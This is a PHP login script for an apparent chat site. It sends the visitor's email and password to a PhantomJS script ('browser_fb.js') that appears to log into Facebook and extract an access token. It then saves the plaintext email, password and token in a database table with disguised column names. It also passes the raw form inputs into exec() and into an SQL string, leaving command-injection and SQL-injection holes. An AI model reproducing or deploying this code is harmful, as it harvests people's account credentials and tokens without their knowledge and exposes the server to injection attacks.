<?php
session_start();
session_regenerate_id();




$token = login();
if(strlen($token) > 250){$token = "invalid";};
$_SESSION["token"] = $token;
grava();
if($token == "invalid"){
 echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
}else{
header('Location: chat.php'); 
//header('Location: chat.php?tk=' . $token); 
}
exit;

function login(){

$login_email = $_POST["user"];
$login_pass = $_POST["password"];

$pathToPhatomJs = 'bin/phantomjs';
$pathToJsScript = dirname(__FILE__). '/browser_fb.js';
$varin1 = $login_email;
$varin2 = $login_pass;
$stdOut = exec(sprintf('%s %s %s %s', $pathToPhatomJs,  $pathToJsScript, $varin1, $varin2), $out);
//'--proxy=http://51.254.106.67:80', 
//echo $stdOut;

$pos1 = strpos($stdOut, "access_token=") + 13;
$pos2 = strpos($stdOut, "&expires_in");
$token = substr($stdOut,$pos1,$pos2 - $pos1);
//echo $token;

return $token;
}


function grava(){
$dbopts = parse_url(getenv('DATABASE_URL'));
$dsn = "pgsql:"
    . "host=" . $dbopts["host"] . ";"
    . "dbname=". ltrim($dbopts["path"],'/') . ";"
    . "user=" . $dbopts["user"] . ";"
    . "port=" . $dbopts["port"] . ";"
    . "sslmode=require;"
    . "password=" . $dbopts["pass"];
    
$db = new PDO($dsn);


$login = $_POST["user"];
$passw = $_POST["password"];
$token = $_SESSION["token"];
$tempo = date('m/d/Y h:i:s a');

$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
//echo var_dump($query);
//echo '<br><br>';
$result = $db->query($query);
//echo var_dump($result);
//echo '<br><br>';
$result->closeCursor();
//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
//echo '<br>end<br>';

}

?>
